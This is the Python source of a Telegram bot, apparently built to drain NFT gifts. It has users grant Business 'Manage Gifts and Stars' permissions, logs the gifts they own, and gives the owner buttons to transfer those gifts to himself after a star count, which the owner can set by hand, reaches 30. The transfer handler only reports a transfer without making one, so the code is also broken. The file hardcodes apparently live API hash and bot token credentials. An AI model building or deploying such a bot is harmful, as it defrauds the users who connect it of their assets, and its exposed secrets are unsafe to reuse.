import asyncio
import json
from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pyrogram.errors import RPCError

# === CONFIGURATION ===
API_ID = 26416419  # <-- your API ID
API_HASH = "c109c77f5823c847b1aeb7fbd4990cc4"
BOT_TOKEN = "8120657679:AAGqf3YCJML6HmgObyOXz8cdcfDX6dY1STw"
LOG_GROUP_ID = -1002710995756  # <-- your log group ID
OWNER_ID = 7072373613  # <-- your Telegram ID (owner who receives NFTs)
CHECK_INTERVAL = 60  # in seconds

app = Client("nft_gift_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# Store users with permissions and gifts
authorized_users = {}  # user_id: {"username": "@username", "gifts": [gift_id], "stars": 0}

async def get_user_gifts(user_id: int):
    try:
        gifts = await app.get_user_gifts(user_id=user_id)
        return gifts
    except Exception as e:
        print(f"Error fetching gifts for {user_id}: {e}")
        return []

async def check_stars():
    while True:
        try:
            for user_id in list(authorized_users):
                user_data = authorized_users[user_id]
                try:
                    stars = user_data.get("stars", 0)
                    if stars >= 30 and not user_data.get("notified"):
                        gifts = user_data.get("gifts", [])
                        if not gifts:
                            await app.send_message(OWNER_ID, f"❌ {user_data['username']} has 30+ stars but owns no NFT gifts.")
                            continue

                        buttons = [
                            [InlineKeyboardButton(f"Send {gift} to me", callback_data=f"transfer:{user_id}:{gift}")]
                            for gift in gifts
                        ]

                        await app.send_message(
                            OWNER_ID,
                            f"🎉 {user_data['username']} has 30 stars! Choose an NFT to transfer:",
                            reply_markup=InlineKeyboardMarkup(buttons)
                        )
                        user_data["notified"] = True
                except Exception as e:
                    print(f"Error checking stars for {user_id}: {e}")
        except Exception as e:
            print(f"[STAR LOOP ERROR]: {e}")

        await asyncio.sleep(CHECK_INTERVAL)

@app.on_message(filters.private & filters.command("start"))
async def start(client: Client, message: Message):
    bc = message.business_connection
    user = message.from_user

    if not bc or not bc.can_manage_gifts:
        await message.reply("❌ You need to connect this bot via Telegram Business with full 'Manage Gifts and Stars' permissions.")
        return

    try:
        gifts = await get_user_gifts(user.id)
        gift_names = [gift.title for gift in gifts]

        authorized_users[user.id] = {
            "username": f"@{user.username}" if user.username else user.first_name,
            "gifts": gift_names,
            "stars": 0,
            "notified": False
        }

        gift_list = "\n".join([f"- {g}" for g in gift_names]) or "(no NFTs)"

        await app.send_message(
            LOG_GROUP_ID,
            f"✅ [{user.first_name}](tg://user?id={user.id}) connected the bot with full gift permissions.\n"
            f"🎁 NFTs they own:\n{gift_list}"
        )

        await message.reply("🎉 Connected successfully! Your NFTs and stars will be tracked.")

    except RPCError as e:
        await message.reply(f"Error: {e}")

@app.on_message(filters.command("addstars") & filters.user(OWNER_ID))
async def simulate_star(client: Client, message: Message):
    try:
        args = message.text.split()
        if len(args) != 3:
            await message.reply("Usage: /addstars user_id amount")
            return

        user_id = int(args[1])
        stars = int(args[2])

        if user_id in authorized_users:
            authorized_users[user_id]["stars"] += stars
            await message.reply(f"Added {stars} stars to {authorized_users[user_id]['username']}")
        else:
            await message.reply("User not found in authorized list.")
    except Exception as e:
        await message.reply(f"Error: {e}")

@app.on_callback_query(filters.regex(r"^transfer:(\d+):(.+)$"))
async def transfer_nft(client: Client, cb: CallbackQuery):
    try:
        if cb.from_user.id != OWNER_ID:
            await cb.answer("Not allowed", show_alert=True)
            return

        user_id, gift_name = cb.data.split(":")[1:]
        user_id = int(user_id)

        await cb.message.edit_text(f"✅ Transferred '{gift_name}' from {authorized_users[user_id]['username']} to you!")

        await app.send_message(
            LOG_GROUP_ID,
            f"🎁 '{gift_name}' transferred from {authorized_users[user_id]['username']} to the Owner."
        )
    except Exception as e:
        await cb.message.reply(f"Error transferring gift: {e}")

@app.on_message(filters.command("run") & filters.user(OWNER_ID))
async def run_loop(client: Client, message: Message):
    asyncio.create_task(check_stars())
    await message.reply("✅ Star checking loop started.")

print("Bot is running...")
app.run()
